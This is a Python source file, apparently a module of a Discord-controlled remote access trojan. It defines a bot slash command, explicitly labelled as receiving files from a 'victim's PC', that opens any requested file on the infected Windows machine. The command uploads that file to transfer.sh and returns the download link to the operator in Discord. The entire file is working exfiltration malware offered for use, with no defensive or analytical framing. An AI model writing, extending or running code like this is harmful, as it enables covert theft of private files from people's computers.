import disnake as discord
from disnake.ext import commands
from datetime import datetime

import os, requests
nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"

class ReceiveFiles(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot
        self.ip_addr = self.bot.ip_addr
        
    @commands.slash_command(
        description="Receives file from victim's PC",
        options=[
            discord.Option("victim", description="IP Address of specific victim", required=True),
            discord.Option("file_path", description="Path of the file for receiving", required=True),
        ]
    )
    async def receivefiles(self, ctx, victim, file_path):
        if str(victim) == str(self.ip_addr):
            await ctx.response.defer()
            
            if '"' in file_path:
                file_path = file_path.replace('"','')
            try: 
                f = open(file_path, "rb")
            except: 
                return await ctx.followup.send(
                    embed=self.bot.genEmbed(
                        "File was not found!", 
                        datetime.now(), 
                        "Please specify a different path and try again"
                    )
                )
            
            file = {'{}'.format(file_path): f}
            response = requests.post('https://transfer.sh/', files=file)
            download_link = response.content.decode('utf-8')

            await ctx.followup.send(
                embed=self.bot.genEmbed(
                    "Received file from victim",
                    datetime.now(),
                    "Link:\n" + download_link
                )
            )
            
def setup(bot: commands.Bot):
    bot.add_cog(ReceiveFiles(bot))